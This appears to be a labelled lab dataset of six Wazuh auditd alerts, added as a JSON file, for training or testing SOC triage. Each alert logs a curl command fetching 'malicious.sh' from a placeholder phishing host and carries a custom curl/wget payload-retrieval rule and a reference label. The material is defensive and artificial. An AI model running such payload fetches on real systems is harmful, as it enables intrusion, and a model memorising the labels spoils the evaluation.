@@ -1,0 +1,560 @@
+[
+  {
+    "scenario": "phishing_url_proxy",
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "78",
+          "pid": "45263",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/usr/bin/curl",
+          "file": {
+            "inode": "2631531",
+            "mode": "0100755",
+            "name": "/usr/bin/curl"
+          },
+          "sgid": "1000",
+          "id": "2616",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-s",
+            "a2": "-m3",
+            "a3": "http://phishing-temp0-batch5.example.invalid/malicious.sh",
+            "a0": "curl"
+          },
+          "euid": "1000",
+          "command": "curl",
+          "ppid": "45227",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 8,
+        "mail": false,
+        "level": 8,
+        "description": "Single network fetch via curl/wget - possible external tool/payload retrieval",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_phishing"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "100099"
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783177901.539:2616): arch=c000003e syscall=59 success=yes exit=0 a0=56083ceb1b70 a1=56083ceb1d20 a2=56083ceadd80 a3=1b6 items=2 ppid=45227 pid=45263 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=78 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783177901.539:2616): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://phishing-temp0-batch5.example.invalid/malicious.sh\" type=CWD msg=audit(1783177901.539:2616): cwd=\"/home/soc\" type=PATH msg=audit(1783177901.539:2616): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783177901.539:2616): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783177901.539:2616): proctitle=6375726C002D73002D6D3300687474703A2F2F7068697368696E672D74656D70302D6261746368352E6578616D706C652E696E76616C69642F6D616C6963696F75732E7368",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T15:11:43.899Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783177903.2063795",
+      "timestamp": "2026-07-04T15:11:43.899+0000"
+    },
+    "reference": {
+      "incident_type": "Recuperation de payload suspect (proxy phishing)",
+      "criticite": "haute",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1105"
+    }
+  },
+  {
+    "scenario": "phishing_url_proxy",
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "78",
+          "pid": "45253",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/usr/bin/curl",
+          "file": {
+            "inode": "2631531",
+            "mode": "0100755",
+            "name": "/usr/bin/curl"
+          },
+          "sgid": "1000",
+          "id": "2612",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-s",
+            "a2": "-m3",
+            "a3": "http://phishing-temp0-batch4.example.invalid/malicious.sh",
+            "a0": "curl"
+          },
+          "euid": "1000",
+          "command": "curl",
+          "ppid": "45227",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 7,
+        "mail": false,
+        "level": 8,
+        "description": "Single network fetch via curl/wget - possible external tool/payload retrieval",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_phishing"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "100099"
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783177889.535:2612): arch=c000003e syscall=59 success=yes exit=0 a0=56083ceb1be0 a1=56083ceb1d20 a2=56083ceadd80 a3=1b6 items=2 ppid=45227 pid=45253 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=78 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783177889.535:2612): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://phishing-temp0-batch4.example.invalid/malicious.sh\" type=CWD msg=audit(1783177889.535:2612): cwd=\"/home/soc\" type=PATH msg=audit(1783177889.535:2612): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783177889.535:2612): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783177889.535:2612): proctitle=6375726C002D73002D6D3300687474703A2F2F7068697368696E672D74656D70302D6261746368342E6578616D706C652E696E76616C69642F6D616C6963696F75732E7368",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T15:11:31.891Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783177891.2055983",
+      "timestamp": "2026-07-04T15:11:31.891+0000"
+    },
+    "reference": {
+      "incident_type": "Recuperation de payload suspect (proxy phishing)",
+      "criticite": "haute",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1105"
+    }
+  },
+  {
+    "scenario": "phishing_url_proxy",
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "78",
+          "pid": "45238",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/usr/bin/curl",
+          "file": {
+            "inode": "2631531",
+            "mode": "0100755",
+            "name": "/usr/bin/curl"
+          },
+          "sgid": "1000",
+          "id": "2606",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-s",
+            "a2": "-m3",
+            "a3": "http://phishing-temp0-batch2.example.invalid/malicious.sh",
+            "a0": "curl"
+          },
+          "euid": "1000",
+          "command": "curl",
+          "ppid": "45227",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 6,
+        "mail": false,
+        "level": 8,
+        "description": "Single network fetch via curl/wget - possible external tool/payload retrieval",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_phishing"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "100099"
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783177865.515:2606): arch=c000003e syscall=59 success=yes exit=0 a0=56083ceb1be0 a1=56083ceb1d60 a2=56083ceadd80 a3=1b6 items=2 ppid=45227 pid=45238 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=78 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783177865.515:2606): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://phishing-temp0-batch2.example.invalid/malicious.sh\" type=CWD msg=audit(1783177865.515:2606): cwd=\"/home/soc\" type=PATH msg=audit(1783177865.515:2606): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783177865.515:2606): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783177865.515:2606): proctitle=6375726C002D73002D6D3300687474703A2F2F7068697368696E672D74656D70302D6261746368322E6578616D706C652E696E76616C69642F6D616C6963696F75732E7368",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T15:11:07.869Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783177867.2039507",
+      "timestamp": "2026-07-04T15:11:07.869+0000"
+    },
+    "reference": {
+      "incident_type": "Recuperation de payload suspect (proxy phishing)",
+      "criticite": "haute",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1105"
+    }
+  },
+  {
+    "scenario": "phishing_url_proxy",
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "78",
+          "pid": "45228",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/usr/bin/curl",
+          "file": {
+            "inode": "2631531",
+            "mode": "0100755",
+            "name": "/usr/bin/curl"
+          },
+          "sgid": "1000",
+          "id": "2602",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-s",
+            "a2": "-m3",
+            "a3": "http://phishing-temp0-batch1.example.invalid/malicious.sh",
+            "a0": "curl"
+          },
+          "euid": "1000",
+          "command": "curl",
+          "ppid": "45227",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 5,
+        "mail": false,
+        "level": 8,
+        "description": "Single network fetch via curl/wget - possible external tool/payload retrieval",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_phishing"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "100099"
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783177853.216:2602): arch=c000003e syscall=59 success=yes exit=0 a0=56083ceb1190 a1=56083ceb1b40 a2=56083ceadd80 a3=1b6 items=2 ppid=45227 pid=45228 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=78 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783177853.216:2602): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://phishing-temp0-batch1.example.invalid/malicious.sh\" type=CWD msg=audit(1783177853.216:2602): cwd=\"/home/soc\" type=PATH msg=audit(1783177853.216:2602): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783177853.216:2602): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783177853.216:2602): proctitle=6375726C002D73002D6D3300687474703A2F2F7068697368696E672D74656D70302D6261746368312E6578616D706C652E696E76616C69642F6D616C6963696F75732E7368",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T15:10:56.058Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783177856.2024642",
+      "timestamp": "2026-07-04T15:10:56.058+0000"
+    },
+    "reference": {
+      "incident_type": "Recuperation de payload suspect (proxy phishing)",
+      "criticite": "haute",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1105"
+    }
+  },
+  {
+    "scenario": "phishing_url_proxy",
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "66",
+          "pid": "42903",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/usr/bin/curl",
+          "file": {
+            "inode": "2631531",
+            "mode": "0100755",
+            "name": "/usr/bin/curl"
+          },
+          "sgid": "1000",
+          "id": "2019",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-s",
+            "a2": "-m3",
+            "a3": "http://phishing-fresh-batch5.example.invalid/malicious.sh",
+            "a0": "curl"
+          },
+          "euid": "1000",
+          "command": "curl",
+          "ppid": "42866",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 4,
+        "mail": false,
+        "level": 8,
+        "description": "Single network fetch via curl/wget - possible external tool/payload retrieval",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_phishing"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "100099"
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783177383.609:2019): arch=c000003e syscall=59 success=yes exit=0 a0=55cdcc836a40 a1=55cdcc836bf0 a2=55cdcc832d80 a3=1b6 items=2 ppid=42866 pid=42903 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=66 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783177383.609:2019): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://phishing-fresh-batch5.example.invalid/malicious.sh\" type=CWD msg=audit(1783177383.609:2019): cwd=\"/home/soc\" type=PATH msg=audit(1783177383.609:2019): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783177383.609:2019): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783177383.609:2019): proctitle=6375726C002D73002D6D3300687474703A2F2F7068697368696E672D66726573682D6261746368352E6578616D706C652E696E76616C69642F6D616C6963696F75732E7368",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T15:03:07.249Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783177387.1057251",
+      "timestamp": "2026-07-04T15:03:07.249+0000"
+    },
+    "reference": {
+      "incident_type": "Recuperation de payload suspect (proxy phishing)",
+      "criticite": "haute",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1105"
+    }
+  },
+  {
+    "scenario": "phishing_url_proxy",
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "66",
+          "pid": "42893",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/usr/bin/curl",
+          "file": {
+            "inode": "2631531",
+            "mode": "0100755",
+            "name": "/usr/bin/curl"
+          },
+          "sgid": "1000",
+          "id": "2015",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-s",
+            "a2": "-m3",
+            "a3": "http://phishing-fresh-batch4.example.invalid/malicious.sh",
+            "a0": "curl"
+          },
+          "euid": "1000",
+          "command": "curl",
+          "ppid": "42866",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 3,
+        "mail": false,
+        "level": 8,
+        "description": "Single network fetch via curl/wget - possible external tool/payload retrieval",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_phishing"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "100099"
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783177371.601:2015): arch=c000003e syscall=59 success=yes exit=0 a0=55cdcc836ab0 a1=55cdcc836bf0 a2=55cdcc832d80 a3=1b6 items=2 ppid=42866 pid=42893 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=66 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783177371.601:2015): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://phishing-fresh-batch4.example.invalid/malicious.sh\" type=CWD msg=audit(1783177371.601:2015): cwd=\"/home/soc\" type=PATH msg=audit(1783177371.601:2015): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783177371.601:2015): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783177371.601:2015): proctitle=6375726C002D73002D6D3300687474703A2F2F7068697368696E672D66726573682D6261746368342E6578616D706C652E696E76616C69642F6D616C6963696F75732E7368",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T15:02:55.236Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783177375.1047555",
+      "timestamp": "2026-07-04T15:02:55.236+0000"
+    },
+    "reference": {
+      "incident_type": "Recuperation de payload suspect (proxy phishing)",
+      "criticite": "haute",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1105"
+    }
+  }
+]
